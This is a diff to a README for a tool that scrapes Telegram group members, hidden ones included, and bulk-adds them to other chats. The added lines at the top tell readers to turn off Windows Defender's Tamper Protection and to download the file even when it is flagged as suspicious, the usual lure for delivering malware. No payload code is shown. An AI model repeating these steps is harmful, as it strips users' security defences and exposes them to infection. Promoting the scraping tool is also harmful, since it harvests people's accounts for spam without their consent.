@@ -1,3 +1,10 @@
+- ( IMPORTANT: Before You Download Anything! )
+
+- ( Windows Search > Tamper Protection > Turn Everything Off To Bypass Defender. )
+
+- If Suspicious Download Appears > Click > Download Suspicious File.
+
+
 # TelegramScraper
 It can scrape and add members from one chat to another chat using some Telegram accounts. Also it can scrape hidden members of group going through group messages. Bot has very user-friendly interface.
 
